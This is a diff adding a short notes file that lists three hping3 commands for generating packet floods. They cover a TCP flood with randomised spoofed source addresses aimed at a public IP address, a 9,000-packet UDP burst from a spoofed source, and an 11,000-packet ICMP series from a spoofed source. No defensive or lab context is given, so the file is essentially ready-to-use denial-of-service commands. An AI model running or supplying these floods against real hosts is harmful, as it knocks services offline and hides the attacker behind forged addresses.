@@ -1,0 +1,7 @@
+1) 10,000 TCP packets all at once from random source IP Addresses =>  hping3 178.128.232.201 --flood --rand-source --data 10000
+
+2) 9,000 UDP packets in a span of 90 seconds from a spoofed source address =>  hping3 -q -n -c 9000 10.0.0.1 --udp -s 53 --keep -p 68 -i u900000 -a 192.168.0.2
+
+3) 11,000 ICMP packets with a data size of 1KB at an interval of 75 packets per second => hping3 -q -n -a 10.0.0.1 --id 0 --icmp -i 75 -d 1000 -c 11000 192.168.0.2
+
+
